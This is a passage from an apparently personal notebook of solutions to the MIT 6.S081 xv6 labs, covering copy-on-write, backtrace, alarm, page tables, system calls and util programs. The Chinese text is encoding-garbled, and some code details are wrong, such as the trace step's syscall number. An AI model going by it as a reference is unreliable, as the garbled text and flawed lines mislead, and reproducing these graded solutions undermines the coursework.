                if (read_ref(REFIDX(pa)) == 1) {  // å½“å‰åªæœ‰ä¸€ä¸ªè™šæ‹Ÿåœ°å€æŒ‡å‘è¿™ä¸ªç‰©ç†é¡µ
                    *pte = (*pte | PTE_W) &amp; (~PTE_C);  // set writable and clear the COW flag
                    pa0 = pa;
                } else {
                    // æ­¤ç‰©ç†é¡µçš„å¼•ç”¨æ•°å¤§äº1
                    char *mem = kalloc_nolock();
                    if (mem == 0) {
                        release_reflock();
                        return -1;
                    } else {
                        memmove(mem, (void *)pa0, PGSIZE);
                        int flag = (PTE_FLAGS(*pte) &amp; ~PTE_C) | PTE_W;  // clear the COW flag
                        *pte = PA2PTE((uint64)mem) | flag;
                        modify_ref(REFIDX(pa), -1);
                        pa0 = (uint64)mem;
                    }
                }
                if (pa0 == 0) {
                    panic(&quot;COW fails&quot;);
                }
                release_reflock();
            } else {
                return -1;
            }
        }
//        pa0 = walkaddr(pagetable, va0);
//        if (pa0 == 0)
//            return -1;
        n = PGSIZE - (dstva - va0);
        if (n &gt; len)
            n = len;
        memmove((void *)(pa0 + (dstva - va0)), src, n);

        len -= n;
        src += n;
        dstva = va0 + PGSIZE;
    }
    return 0;
}
</code></pre>
<p>END</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6s081-traps"><a class="header" href="#mit-6s081-traps">MIT 6.S081 Traps</a></h1>
<h2 id="backtrace"><a class="header" href="#backtrace">backtrace</a></h2>
<p>åˆ©ç”¨frame pointeræ¥å®Œæˆè°ƒç”¨è¿½è¸ªã€‚</p>
<p>ç”¨æˆ·æ ˆ<a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">ç»“æ„</a></p>
<pre><code class="language-c">// kernel/printf.c
void
backtrace(void)
{
    printf(&quot;backtrace:\n&quot;);
    uint64 fp = r_fp();

    uint64 pageUpBound = PGROUNDUP(fp);
//    uint64 pageDownBound = PGROUNDDOWN(fp);
    while (fp &lt; pageUpBound) {
        printf(&quot;%p\n&quot;, *(uint64 *)(fp-8));
        fp = *(uint64 *)(fp - 16);
    }
}
</code></pre>
<p>è¿è¡Œç»“æœ</p>
<pre><code class="language-sh">xv6 kernel is booting

hart 1 starting
hart 2 starting
init: starting sh
$ ./bttest
backtrace:
0x000000008000211c
0x0000000080001ff6
0x0000000080001cda
$ QEMU: Terminated
sugar@ubuntuServer:~/xv6-labs-2021$ addr2line -e kernel/kernel
0x000000008000211c
0x0000000080001ff6
0x0000000080001cda/home/sugar/xv6-labs-2021/kernel/sysproc.c:63
/home/sugar/xv6-labs-2021/kernel/syscall.c:140
/home/sugar/xv6-labs-2021/kernel/trap.c:76
</code></pre>
<h2 id="alarm"><a class="header" href="#alarm">Alarm</a></h2>
<h3 id="test0"><a class="header" href="#test0">test0</a></h3>
<p>é€šè¿‡ç³»ç»Ÿè°ƒç”¨sigalarmæ³¨å†Œtimerä¸­æ–­å¤„ç†ç¨‹åºï¼Œæ—¶é—´é—´éš”åˆ°äº†ä¹‹åï¼Œæ‰§è¡Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ã€‚</p>
<p>é¦–å…ˆå¢åŠ æ–°çš„ç³»ç»Ÿè°ƒç”¨</p>
<pre><code class="language-c">// user/user.h
int sigalarm(int ticks, void (*handler)());
int sigreturn(void);

// user/usys.pl
entry(&quot;sigalarm&quot;);
entry(&quot;sigreturn&quot;);


// kernel/syscall.h
#define SYS_sigalarm 22
#define SYS_sigreturn 23

// kernel/syscall.c
extern uint64 sys_sigalarm(void);
extern uint64 sys_sigreturn(void);

static uint64 (*syscalls[])(void) = {
 ....
[SYS_sigalarm] sys_sigalarm,
[SYS_sigreturn] sys_sigreturn,
};

uint64
sys_sigalarm(void)
{
    int interval;
    uint64 handler;
    if (argint(0, &amp;interval) &lt; 0)
        return -1;
    if (argaddr(1, &amp;handler) &lt; 0)
        return -1;

    struct proc *p = myproc();
    p-&gt;handler = handler;
    p-&gt;interval = interval;
    p-&gt;ticks = 0;

    return 0;
}

uint64
sys_sigreturn(void)
{
    return 0;
}
</code></pre>
<p>ä¿®æ”¹procçš„ç»“æ„ï¼Œä¿å­˜å®šæ—¶å™¨ç›¸å…³çš„è®°å½•æˆå‘˜ï¼ˆé—´éš”ï¼Œå¤„ç†å‡½æ•°æŒ‡é’ˆï¼Œè‡ªä¸Šæ¬¡è°ƒç”¨æµé€äº†å¤šå°‘ticksï¼Œæ˜¯å¦æ­£åœ¨å¤„ç†alarmï¼‰</p>
<pre><code class="language-c">// Per-process state
struct proc {
  // for alarm
  int interval;                 // the alarm interval
  uint64 handler;            // the periodically called function pointer
  int ticks;                    // time since last call
  int in_alarm;                 // while the kernel is processing alarm handler
};

// kernel/proc.c
static struct proc*
allocproc(void)
{
....
found:
  p-&gt;pid = allocpid();
  p-&gt;state = USED;
  // initialize for alarm
  p-&gt;ticks = 0;
  p-&gt;handler = 0;
  p-&gt;interval = 0;
  p-&gt;in_alarm = 0;
....
}
</code></pre>
<p>æœ€ååœ¨trap.cä¸­å¤„ç†æ—¶é’Ÿä¸­æ–­ï¼Œæ³¨æ„ï¼Œä»å†…æ ¸ç©ºé—´è¿”å›åï¼Œæ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ä¼šä»trapframeçš„epcå¤åˆ¶åˆ°pcï¼Œè¿›è€Œæ‰§è¡Œç›¸å…³çš„handlerå‡½æ•°ï¼ˆalarmï¼‰</p>
<pre><code class="language-c">// give up the CPU if this is a timer interrupt.
  if(which_dev == 2) {
      // timer interrupt
      if (p-&gt;interval != 0) {
          p-&gt;ticks++;  // åœ¨å¤„ç†alarmçš„æ—¶å€™ä¹Ÿéœ€è¦è®¡æ—¶
          if (p-&gt;in_alarm == 0) {
              if (p-&gt;ticks &gt; p-&gt;interval) {
                  p-&gt;ticks = 0;
                  p-&gt;in_alarm = 1;
//              printf(&quot;Call the handler.\n&quot;);
//              p-&gt;handler();
                  p-&gt;trapframe-&gt;epc = p-&gt;handler;  // ä»å†…æ ¸ç©ºé—´è¿”å›çš„æ—¶å€™ï¼Œæ‰§è¡Œçš„åœ°å€
              }
          }
      }
      yield();
  }
</code></pre>
<p>è¿è¡Œç»“æœ</p>
<pre><code class="language-sh">$ ./alarmtest
test0 start
......alarm!
test0 passed
test1 start
...............................................................QEMU: Terminated
</code></pre>
<h3 id="test1"><a class="header" href="#test1">test1</a></h3>
<p>å®ç°ä»ä¸­æ–­å¤„ç†ç¨‹åºä¸­è¿”å›åˆ°ç”¨æˆ·ç¨‹åºï¼Œè¦å¢åŠ ä¿å­˜çš„å¯„å­˜å™¨ã€‚</p>
<pre><code class="language-c">// kernel/proc.h
// Per-process state
struct proc {
  ......
  // for alarm
  int interval;                 // the alarm interval
  uint64 handler;            // the periodically called function pointer
  int ticks;                    // time since last call
  int in_alarm;                 // while the kernel is processing alarm handler
  int user_epc;              // user program's pc
  struct trapframe user_frame;  // saved 32 user's register
};

// kernel/sysproc.c
uint64
sys_sigreturn(void)
{
    struct proc *p = myproc();
    p-&gt;trapframe-&gt;epc = p-&gt;user_epc;  // åŸå§‹ç”¨æˆ·è¿›ç¨‹çš„epc
    memmove(p-&gt;trapframe, &amp;p-&gt;user_frame, sizeof (p-&gt;user_frame));
    p-&gt;in_alarm = 0;
    return 0;
}

//kernel/trap.c
void
usertrap(void)
{
...
// give up the CPU if this is a timer interrupt.
  if(which_dev == 2) {
      // timer interrupt
      if (p-&gt;interval != 0) {
          p-&gt;ticks++;  // åœ¨å¤„ç†alarmçš„æ—¶å€™ä¹Ÿéœ€è¦è®¡æ—¶
          if (p-&gt;in_alarm == 0) {
              if (p-&gt;ticks &gt; p-&gt;interval) {
                  p-&gt;ticks = 0;
                  p-&gt;in_alarm = 1;
                  p-&gt;user_epc = p-&gt;trapframe-&gt;epc;
                  // memmove(dst, src, size)
                  memmove(&amp;p-&gt;user_frame, p-&gt;trapframe, sizeof(p-&gt;user_frame));
                  p-&gt;trapframe-&gt;epc = p-&gt;handler;  // ä»å†…æ ¸ç©ºé—´è¿”å›çš„æ—¶å€™ï¼Œæ‰§è¡Œçš„åœ°å€
              }
          }
      }
      yield();
  }
...
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="page-tables"><a class="header" href="#page-tables">Page Tables</a></h1>
<h2 id="åŠ é€Ÿç³»ç»Ÿè°ƒç”¨"><a class="header" href="#åŠ é€Ÿç³»ç»Ÿè°ƒç”¨">åŠ é€Ÿç³»ç»Ÿè°ƒç”¨</a></h2>
<p>åœ¨åˆ†é…æ¯ä¸ªprocessçš„æ—¶å€™ï¼Œå¢åŠ ä¸€ä¸ªæ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ä¸ºUSYSCALLï¼ˆå®šä¹‰äºkernel/memlayout.cï¼‰çš„ç‰©ç†é¡µï¼Œä¿å­˜æŸäº›å¯ä»¥ç›´æ¥è®¿é—®çš„ç³»ç»Ÿè°ƒç”¨çš„ç›¸åŒç»“æœï¼Œå¦‚è¿›ç¨‹çš„pid</p>
<p>è¿™é‡Œè¦åŠ é€Ÿçš„è°ƒç”¨ç¨‹åºæ˜¯ugetpidï¼ˆå®šä¹‰ä¸user/ulib.cï¼‰</p>
<pre><code class="language-c">int
ugetpid(void)
{
  struct usyscall *u = (struct usyscall *)USYSCALL;
  return u-&gt;pid;
}
</code></pre>
<p>åœ¨kernel/proc.cä¸­çš„allocprocå‡½æ•°ä¸­å¢åŠ åˆ†é…ä¸€ä¸ªç‰©ç†é¡µï¼ŒåŒæ—¶å¯¹è¿›ç¨‹è®°å½•proc.hå¢åŠ ä¸€ä¸ªusyscallpaçš„æˆå‘˜è®°å½•æ­¤ç‰©ç†åœ°å€</p>
<pre><code class="language-c">static struct proc*
allocproc(void)
{
...
// Allocate a page for usyscall
  if((p-&gt;usyscallpa = (struct usyscall *)kalloc()) == 0) {
      freeproc(p);
      release(&amp;p-&gt;lock);
      return 0;
  }
  p-&gt;usyscallpa-&gt;pid = p-&gt;pid;
...
}
</code></pre>
<p>åœ¨proc_pagetable()å¢åŠ å¯¹æ­¤ç‰©ç†é¡µåˆ°USYSCALLçš„æ˜ å°„ï¼Œä¸è¦å¿˜äº†åœ¨proc_freepagetableä¸­å–æ¶ˆæ­¤æ˜ å°„ï¼ˆå¦‚æœä¸å–æ¶ˆï¼Œé‚£ä¹ˆåœ¨freewalkä¸­ä¼šå‡ºç°leafèŠ‚ç‚¹æ²¡æœ‰è¢«å…ˆé‡Šæ”¾çš„é—®é¢˜ï¼‰</p>
<pre><code class="language-c">pagetable_t
proc_pagetable(struct proc *p)
{
...
// map the va USYSCALL to the pa USYSCALL in user memory
  if (mappages(pagetable, USYSCALL, PGSIZE,
               (uint64)(p-&gt;usyscallpa), PTE_R) &lt; 0) {
      uvmunmap(pagetable, USYSCALL, 1, 0);
      uvmfree(pagetable, 0);
      return 0;
  }

  return pagetable;
}
// Free a process's page table, and free the
// physical memory it refers to.
void
proc_freepagetable(pagetable_t pagetable, uint64 sz)
{
  uvmunmap(pagetable, TRAMPOLINE, 1, 0);
  uvmunmap(pagetable, TRAPFRAME, 1, 0);
  // Remenber to unmap the usyscall mapping
  uvmunmap(pagetable, USYSCALL, 1, 0);
  uvmfree(pagetable, sz);
}
</code></pre>
<p>åœ¨free_proc()ä¸­é‡Šæ”¾æ­¤ç‰©ç†é¡µçš„ç©ºé—´Â </p>
<pre><code class="language-c">static void
freeproc(struct proc *p)
{
...
  if(p-&gt;usyscallpa)
      kfree((void*)p-&gt;usyscallpa);
  p-&gt;usyscallpa = 0;
...
}
</code></pre>
<p>å‡ºç°é—®é¢˜ï¼š</p>
<pre><code class="language-sh">xv6 kernel is booting

hart 2 starting
init: starting sh
$ hart 1 starting
./pgtbltest
ugetpid_test starting
usertrap(): unexpected scause 0x000000000000000d pid=4
            sepc=0x000000000000049c stval=0x0000003fffffd000
$ QEMU: Terminated
</code></pre>
<p>è§£å†³ï¼Œåœ¨æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€æ—¶å¢åŠ ç”¨æˆ·å¯è®¿é—®æ ‡å¿—PTE_U</p>
<pre><code class="language-c">if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usyscallpa), PTE_R | PTE_U) &lt; 0) {  // å¯è¯» ï½œ userå¯è®¿é—®
</code></pre>
<h2 id="print-a-page-table"><a class="header" href="#print-a-page-table">Print a page table</a></h2>
<p>æ‰“å°é¡µè¡¨æ¡ç›®ï¼ˆpteï¼‰ï¼Œæ ¹æ®é¡µè¡¨ç­‰çº§è¿›è¡Œæ·±åº¦ä¼˜å…ˆéå†ï¼Œå¯ä»¥å‚è€ƒkernel/vm.cä¸­çš„freewalkå‡½æ•°è¿›è¡Œå®ç°ã€‚</p>
<pre><code class="language-c">void vmpgtbprint(pagetable_t pagetable, int level) {
    for (int i = 0; i &lt; 512; ++i) {
        pte_t pte = pagetable[i];
        if (pte &amp; PTE_V) {
            uint64 pa = PTE2PA(pte);
            for (int l = level; l &gt; 0; --l) {
                printf(&quot; ..&quot;);
            }
            printf(&quot;%d: pte %p pa %p\n&quot;,i, pte, pa);
            if (level &lt; 3) {
                vmpgtbprint((pagetable_t)pa, level+1);
            }
        }
    }
}

void vmprint(pagetable_t pagetable) {
    printf(&quot;page table %p\n&quot;, pagetable);
    vmpgtbprint(pagetable, 1);
}
</code></pre>
<h2 id="detecting-which-pages-have-been-accessed"><a class="header" href="#detecting-which-pages-have-been-accessed">Detecting which pages have been accessed</a></h2>
<p>é€šè¿‡å®šä¹‰PTE_Aä½ï¼ˆå‚è€ƒRISC-V privilegeæ‰‹å†Œä¸­çš„é¡µè¡¨è¡¨é¡¹çš„ä½å®šä¹‰ï¼‰ï¼Œåœ¨è®¿é—®äº†ä¸€ä¸ªé¡µçš„æ—¶å€™ï¼ŒPTE_Aä¼šè¢«ç½®ä½ã€‚å®ç°ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨pgaccessï¼Œæ ¹æ®ç”¨æˆ·æä¾›çš„èµ·å§‹è™šæ‹Ÿåœ°å€ï¼Œéå†é¡µè¡¨ï¼Œç»Ÿè®¡è¢«è®¿é—®çš„PTE_Vã€‚è¿”å›ä¸€ä¸ªbitmaskè¡¨ç¤ºä»èµ·å§‹åœ°å€å¼€å§‹å“ªäº›é¡µè¢«è®¿é—®äº†ã€‚</p>
<p>æ³¨æ„åœ¨riscv.hä¸­å®šä¹‰PTE_Açš„ä½ã€‚</p>
<pre><code class="language-c">int
sys_pgaccess(void)
{
  // lab pgtbl: your code here.
  struct proc *p = myproc();

  uint64 userpage;  // the starting virtual address of the first user page to check
  int pagenum;
  uint64 abitsaddr;

  if(argaddr(0, &amp;userpage) &lt; 0)
      return -1;
  if(argint(1, &amp;pagenum) &lt; 0)
      return -1;
  if(argaddr(2, &amp;abitsaddr) &lt; 0)
      return -1;

  if (pagenum &gt; 64) {
      printf(&quot;Exceed the maximum of pages that can be scaned.\n&quot;);
      return -1;
  }
  uint64 bitmask = 0;
  for (int i = 0; i &lt; pagenum; i++) {
      pte_t *pte = walk(p-&gt;pagetable, userpage + i * PGSIZE, 0);
      if ((*pte &amp; PTE_V) &amp;&amp; (*pte &amp; PTE_A)) {
          bitmask |= (1 &lt;&lt; i);
          *pte = (*pte &amp; (~PTE_A)); // clear
//          printf(&quot;DEBUG: find accessed page. bitmask=%p, pte=%p\n&quot;, bitmask, *pte);
      }
  }

  if(copyout(p-&gt;pagetable, abitsaddr, (char *)&amp;bitmask, sizeof(uint64)) &lt; 0)
      return -1;
  return 0;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6828-system-calls"><a class="header" href="#mit-6828-system-calls">MIT 6.828 System calls</a></h1>
<p>asm volatile å†…åµŒæ±‡ç¼–æŒ‡ä»¤<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html">è¯­æ³•</a></p>
<h2 id="system-call-tracing"><a class="header" href="#system-call-tracing">System call tracing</a></h2>
<p>å¢åŠ ä¸€ä¸ªtraceç³»ç»Ÿè°ƒç”¨ï¼Œç”¨æˆ·åœ¨å…¶ä»–å‘½ä»¤å‰è¾“å…¥traceåï¼Œè·Ÿè¸ªè®°å½•å‘½ä»¤ä½¿ç”¨çš„ç›¸å…³ç³»ç»Ÿè°ƒç”¨ï¼ˆmaskæŒ‡ç¤ºè¦è·Ÿè¸ªå“ªäº›ï¼‰</p>
<pre><code class="language-sh">$ trace mask command [args]
</code></pre>
<h3 id="æ­¥éª¤-1"><a class="header" href="#æ­¥éª¤-1">æ­¥éª¤</a></h3>
<p>1ã€åœ¨Makefileä¸­å¢åŠ  $U/_trace åˆ°UPROGSï¼Œç”¨äºç¼–è¯‘ç”¨æˆ·ç¨‹åºuser/trace.c</p>
<p>2ã€åœ¨user/user.hä¸­å¢åŠ traceç³»ç»Ÿè°ƒç”¨çš„åŸå‹</p>
<pre><code class="language-c">int trace(int);
</code></pre>
<p>3ã€åœ¨user/usys.plä¸­å¢åŠ traceçš„æ±‡ç¼–æŒ‡ä»¤ç”Ÿæˆentry</p>
<pre><code class="language-pl">entry(&quot;trace&quot;);
</code></pre>
<p>4ã€åœ¨kernel/syscall.hä¸­å¢åŠ traceç³»ç»Ÿè°ƒç”¨çš„ç¼–å·</p>
<pre><code class="language-c">#define SYS_sysinfo 23
</code></pre>
<p>5ã€åœ¨kernel/proc.hä¸­çš„procç»“æ„ä½“å®šä¹‰æ–°æˆå‘˜tracemaskï¼Œä¿å­˜mask</p>
<pre><code class="language-c">// Per-process state
struct proc {
  struct spinlock lock;

  // p-&gt;lock must be held when using these:
  enum procstate state;        // Process state
  void *chan;                  // If non-zero, sleeping on chan
  int killed;                  // If non-zero, have been killed
  int xstate;                  // Exit status to be returned to parent's wait
  int pid;                     // Process ID

  // wait_lock must be held when using this:
  struct proc *parent;         // Parent process

  // these are private to the process, so p-&gt;lock need not be held.
  uint64 kstack;               // Virtual address of kernel stack
  uint64 sz;                   // Size of process memory (bytes)
  pagetable_t pagetable;       // User page table
  struct trapframe *trapframe; // data page for trampoline.S
  struct context context;      // swtch() here to run process
  struct file *ofile[NOFILE];  // Open files
  struct inode *cwd;           // Current directory
  char name[16];               // Process name (debugging)

  int tracemask;               // For system call lab, remember the trace() argument
};
</code></pre>
<p>6ã€åœ¨kernel/proc.cä¸­çš„fork()å‡½æ•°å¢åŠ å¤åˆ¶çˆ¶è¿›ç¨‹çš„maskåˆ°å­è¿›ç¨‹ï¼Œæ³¨æ„è¦åœ¨åŠ é”çš„æ—¶å€™</p>
<p>7ã€åœ¨kernel/sysproc.cä¸­å®šä¹‰sys_traceå‡½æ•°ï¼Œå®é™…å¤„ç†ç³»ç»Ÿè°ƒç”¨</p>
<pre><code class="language-c">uint64
sys_trace(void) {
    int mask;

    if (argint(0, &amp;mask) &lt; 0) {  // ä»trap frameä¸­è·å–ç”¨æˆ·çš„å‚æ•°
        return -1;
    }

    myproc()-&gt;tracemask = mask;
    return 0;
}
</code></pre>
<p>8ã€åœ¨kernel/syscall.cä¸­å¢åŠ æ­¤ç³»ç»Ÿè°ƒç”¨åˆ°system call tableä¸­ï¼Œç”¨æ¥æ˜ å°„ç³»ç»Ÿè°ƒç”¨åºå·SYS_traceåˆ°sys_traceå‡½æ•°</p>
<h2 id="sysinfo"><a class="header" href="#sysinfo">Sysinfo</a></h2>
<p>æ­¥éª¤1ã€2ã€3ã€4ã€8ä¸ä¸Šç›¸åŒ</p>
<p>åœ¨kernel/sysproc.cä¸­å®ç°sys_sysinfoå‡½æ•°æ—¶ï¼Œéœ€è¦å‚è€ƒkernel/sysfile.cå’Œkernel/file.cä¸­å¯¹ç”¨æˆ·ç©ºé—´åœ°å€çš„è®¿é—®ï¼ˆå†™ï¼Œcopyout()å‡½æ•°ï¼‰</p>
<pre><code class="language-c">uint64
sys_sysinfo(void) {
    struct proc *p = myproc();
    uint64 infoaddr; // address of the user argument
    if (argaddr(0, &amp;infoaddr) &lt; 0) {
        return -1;
    }
    struct sysinfo info;
    info.freemem = freespaces();
    info.nproc = procnum();

    if(copyout(p-&gt;pagetable, infoaddr, (char *)&amp;info, sizeof(info)) &lt; 0)
        return -1;
    return 0;
}
</code></pre>
<p>åœ¨kernel/kalloc.cä¸­å®ç°è·å–ç©ºé—²ç©ºé—´å¤§å°çš„å‡½æ•°</p>
<pre><code class="language-c">// Returns the free space size of bytes
int
freespaces(void) {
    struct run *r;
    int freenum = 0;

    acquire(&amp;kmem.lock);
    r = kmem.freelist;
    while (r) {
        freenum++;
        r = r-&gt;next;
    }
    release(&amp;kmem.lock);
    return freenum * PGSIZE;
}
</code></pre>
<p>åœ¨kernel/proc.cä¸­å®ç°è·å–æ­£åœ¨ä½¿ç”¨çš„è¿›ç¨‹çš„æ•°ç›®çš„å‡½æ•°</p>
<pre><code class="language-c">// Returns the number of processes whose state is not UNUSED
int procnum(void) {
    struct proc* p;
    int nums = 0;

    for (p = proc; p &lt; &amp;proc[NPROC]; p++) {
        if (p-&gt;state != UNUSED) {
            nums++;
        }
    }
    return nums;
}
</code></pre>
<p>åœ¨kernel/defs.hä¸­å¢åŠ ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„å£°æ˜</p>
<p>å®Œæˆå®ç°kernel/sysproc.cä¸­çš„sys_sysinfo</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mit-6828-util-lab"><a class="header" href="#mit-6828-util-lab">MIT 6.828 Util Lab</a></h1>
<p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸Šå®ç°ä¸€äº›å®ç”¨å°ç¨‹åº</p>
<h2 id="å®éªŒå‡†å¤‡lab1-boot-xv6"><a class="header" href="#å®éªŒå‡†å¤‡lab1-boot-xv6">å®éªŒå‡†å¤‡ï¼ˆLab1 Boot xv6ï¼‰</a></h2>
<p>åœ¨ubuntu18ä¸Šè¿›è¡Œå®éªŒ</p>
<p>æ ¹æ®2021å¹´çš„å®éªŒ<a href="https://pdos.csail.mit.edu/6.828/2021/tools.html">ç½‘ç«™</a>è¿›è¡Œé…ç½®ï¼Œä½†æ˜¯å‘ç°ç”¨ä¸äº†qemu-system-riscv64ï¼Œåªèƒ½è‡ªå·±æ‰‹åŠ¨æ„å»ºriscvçš„toolchainï¼Œå‚è€ƒ2020å¹´çš„<a href="https://pdos.csail.mit.edu/6.828/2020/tools.html">ç½‘ç«™</a>ã€‚</p>
<p>é¡¹ç›®å…‹éš†ä¸‹æ¥åï¼Œä½¿ç”¨makeæ—¶æç¤ºriscv64-linux-gnu-gccçš„å‘½ä»¤è¡Œå‚æ•°é”™è¯¯ï¼Œå‚ç…§è¿™ä¸ª<a href="https://github.com/mit-pdos/xv6-riscv/issues/7">issue</a>æ›´æ”¹Makefileã€‚</p>
<p>æœ€ç»ˆå¯ä»¥make qemuäº†ã€‚</p>
<h2 id="lab2-sleep"><a class="header" href="#lab2-sleep">Lab2 sleep</a></h2>
<p>åˆ©ç”¨xv6çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå®ç°sleepå‘½ä»¤ã€‚</p>
<p>ä½¿ç”¨ <code>$Â ./grade-lab-util sleep</code> å¯¹å®éªŒæ‰“åˆ†</p>
<pre><code class="language-c">#include &quot;kernel/types.h&quot;
#include &quot;kernel/stat.h&quot;
#include &quot;user/user.h&quot;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(2, &quot;Usage: sleep [seconds]\n&quot;);
        exit(1);
    }
    int seconds = atoi(argv[1]);
    sleep(seconds);
    exit(0);
}
</code></pre>
<h2 id="lab3-pingpong"><a class="header" href="#lab3-pingpong">Lab3 pingpong</a></h2>
<p>é€šè¿‡åˆ›å»ºç®¡é“å®ç°çˆ¶å­è¿›ç¨‹é€šä¿¡ï¼Œæ³¨æ„ï¼Œå¯¹äºä¸€ä¸ªè¿›ç¨‹æ¥è¯´ï¼Œç®¡é“æ˜¯å•å‘çš„ï¼Œæ‰€ä»¥è¦å®ç°åŒå‘é€šè®¯ï¼Œå¿…é¡»åˆ›å»ºä¸¤ä¸ªç®¡é“ã€‚</p>
<p>read(read_pipe, buf, buf_len)æ˜¯é˜»å¡çš„ï¼Œé™¤éå…³é—­äº†ç®¡é“çš„æ‰€æœ‰å†™ç«¯å£ï¼ˆåŒ…æ‹¬å­è¿›ç¨‹ï¼‰ï¼Œreadè¿”å›0ã€‚</p>
<pre><code class="language-c">#include &quot;kernel/types.h&quot;
#include &quot;kernel/stat.h&quot;
#include &quot;user/user.h&quot;

int main(void) {
    int p2c[2], c2p[2];
    char buf[1];

    if(pipe(p2c) &lt; 0) {
        fprintf(2, &quot;%s\n&quot;, &quot;Cannot create pipe p2c.&quot;);
        exit(1);
    }

    if(pipe(c2p) &lt; 0) {
        fprintf(2, &quot;%s\n&quot;, &quot;Cannot create pipe c2p.&quot;);
        exit(1);
    }


    if (fork() == 0) {
        // child process
        close(p2c[1]);  // close the write to parent

        read(p2c[0], buf, 1);
        printf(&quot;%d: received ping\n&quot;, getpid());  // 2. child receive the byte
        close(c2p[0]);
        write(c2p[1], buf, 1);  // 3. tell parent

        close(p2c[0]);
        close(c2p[1]);
        exit(0);
    } else {
        close(p2c[0]);  // close the read

        write(p2c[1], &quot;a&quot;, 1);   // 1. send a byte to child

        close(c2p[1]);
        read(c2p[0], buf, 1);
        printf(&quot;%d: received pong\n&quot;, getpid());  // 4. parent got the byte

        close(p2c[1]);
        close(c2p[0]);
        exit(0);
    }
}
</code></pre>
<h2 id="lab4-primes"><a class="header" href="#lab4-primes">Lab4 primes</a></h2>
<p>ä½¿ç”¨ç®¡é“å®ç°ç´ æ•°ç­›ï¼Œæ¯ä¸€ä¸ªé˜¶æ®µå®ç°æ‰“å°ç®¡é“ä¸­åˆ°æ¥çš„ç¬¬ä¸€ä¸ªç´ æ•°aï¼Œåˆ¤æ–­å‰©ä½™åˆ°è¾¾çš„æ•°æ˜¯å¦èƒ½è¢«aæ•´é™¤ï¼Œå¦‚æœä¸èƒ½ï¼Œåˆ™é€å…¥ä¸‹ä¸€é˜¶æ®µçš„ç®¡é“ã€‚<a href="https://stackoverflow.com/questions/64839416/implementation-of-sieve-of-eratosthenes-in-c">å‚è€ƒ</a>å®ç°ã€‚</p>
<pre><code class="language-c">#include &quot;kernel/types.h&quot;
#include &quot;kernel/stat.h&quot;
#include &quot;user/user.h&quot;

const int limit = 35;

void panic(char* buf) {
    fprintf(2, &quot;%s\n&quot;, buf);
    exit(1);
}

void cull(int readPipe, int writePipe, int prime) {
    uint32 n;
    while (read(readPipe, &amp;n, 4)) {
        if (n % prime != 0) {
            write(writePipe, &amp;n, 4);
        }
    }
}
/**
 * return the another pipe contains group of numbers that cannot be divided by prime
 * @param prime
 * @param readPipe
 * @return
 */
void primeFilters(int readPipe) {
    uint32 prime;
    if (read(readPipe, &amp;prime, 4)) {
        printf(&quot;prime %d\n&quot;, prime);

        int newPipe[2];
        if (pipe(newPipe) &lt; 0) {
            panic(&quot;cannot create pipe.&quot;);
        }

        if (fork() == 0) {
            // child generate new sequence
            close(newPipe[0]);
            cull(readPipe, newPipe[1], prime);
            close(newPipe[1]);
        } else {
            // parent forward the pipe to next stage
            close(newPipe[1]);
            primeFilters(newPipe[0]);
            close(newPipe[0]);
        }
    }
}

int main(void) {
    int p[2];
    if (pipe(p) &lt; 0) {
        panic(&quot;Cannot create pipe.&quot;);
    }

    if (fork() == 0) {
        // child
        close(p[1]);
        primeFilters(p[0]);
        close(p[0]);
    } else {
        // parent
        close(p[0]);
        for (uint32 i = 2; i &lt;= limit; ++i) {
            write(p[1], &amp;i, 4);
        }
        close(p[1]);
        wait(0); // wait all children
    }
    exit(0);
}
</code></pre>
<h2 id="lab5-find"><a class="header" href="#lab5-find">Lab5 find</a></h2>
<p>é€’å½’å¾—æŸ¥æ‰¾ç›®å½•ï¼Œç”¨äº†æ¥è‡ªls.cçš„fmtnameæ¥è§„èŒƒåŒ–æ–‡ä»¶åï¼ŒåŒæ—¶å€Ÿé‰´grep.cçš„æ­£åˆ™åŒ¹é…ã€‚</p>
<pre><code class="language-c">#include &quot;kernel/types.h&quot;
#include &quot;kernel/stat.h&quot;
#include &quot;user/user.h&quot;
#include &quot;kernel/fs.h&quot;

char curDir[DIRSIZ], parDir[DIRSIZ];
int match(char*, char*);

char* fmtname(char *path)
{
    static char buf[DIRSIZ+1];
    char *p;

    // Find first character after last slash.
    for(p=path+strlen(path); p &gt;= path &amp;&amp; *p != '/'; p--)
        ;
    p++;

    // Return blank-padded name.
    if(strlen(p) &gt;= DIRSIZ)
        return p;
    memmove(buf, p, strlen(p));
    memset(buf+strlen(p), ' ', DIRSIZ-strlen(p));
    return buf;
}

char *trim(char *path) {
    char *p;
    static char buf[DIRSIZ];
    for (p = path + strlen(path) - 1; p &gt;= path &amp;&amp; *p == ' '; p--)
        ;
    p++;
    memmove(buf, path, p-path);
    buf[p-path] = 0;
    return buf;
}

void find(char* path, char* name) {
    int fd;
    struct dirent de;
    char buf[512], *p;
    struct stat st;

    if((fd = open(path, 0)) &lt; 0){
        fprintf(2, &quot;find: cannot open %s\n&quot;, path);
        return;
    }

    if(fstat(fd, &amp;st) &lt; 0){
        fprintf(2, &quot;find: cannot stat %s\n&quot;, path);
        close(fd);
        return;
    }

    char *dirname = fmtname(path);
//    if (strcmp(name, dirname) == 0) { // compare
    if (match(name, trim(dirname))) {
        printf(&quot;%s\n&quot;, dirname);
        return;
    }

    if (st.type == T_DIR) {
        if(strlen(path) + 1 + DIRSIZ + 1 &gt; sizeof buf){
            printf(&quot;find: path too long\n&quot;);
            return;
        }

        strcpy(buf, path);
        p = buf+strlen(buf);
        *p++ = '/';

        while(read(fd, &amp;de, sizeof(de))) {
            if (de.inum == 0) {
                continue;
